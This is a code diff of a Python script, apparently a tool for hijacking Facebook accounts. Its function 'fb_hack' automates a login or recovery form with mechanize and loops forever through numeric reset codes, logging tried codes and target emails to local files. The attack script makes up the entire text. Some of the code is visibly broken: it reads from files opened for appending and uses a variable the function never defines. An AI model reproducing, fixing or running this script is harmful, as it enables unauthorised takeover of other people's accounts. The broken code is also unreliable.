@@ -108,9 +108,7 @@ def sleepy(counter):
     print(x, end='\r')
     sleep(1)
 
-def fb_hack(email, codex, backup):
-  reset = int(backup)
-  y = str(backup)
+def fb_hack(email, codex):
   soup = BeautifulSoup()
   browser = mechanize.Browser()
   browser.set_handle_robots(False)
@@ -122,14 +120,26 @@ def fb_hack(email, codex, backup):
   try:
     browser.select_form(nr=0)
   except:
+    z = open("passcoder.txt", "a")
+    z.write(str(int(codex)))
+    reset = z.readlines(-1)
+    y = z.readlines(-1)
+    z.close()
     raise
-  browser.select_form(nr=0)
   browser.form['email'] = email
   browser.submit()
   """selection confirmation"""
   try:
     browser.select_form(nr=0)
   except:
+    f = open("emails.txt", "a")
+    z = open("passcoder.txt", "a")
+    f.write(ehack)
+    f.close()
+    z.write(str(int(codex)))
+    reset = z.readlines(-1)
+    y = z.readlines(-1)
+    z.close()
     raise
   browser.submit()
   browser.select_form(nr=0)
@@ -237,8 +247,8 @@ f.write(ehack)
 f.close()
 z.write(str(reset1))
 z.close()
-starting = int(1)
-while starting == int(1):
+
+while True:
   try:
     fb_hack(ehack, reset)
     reset = reset1
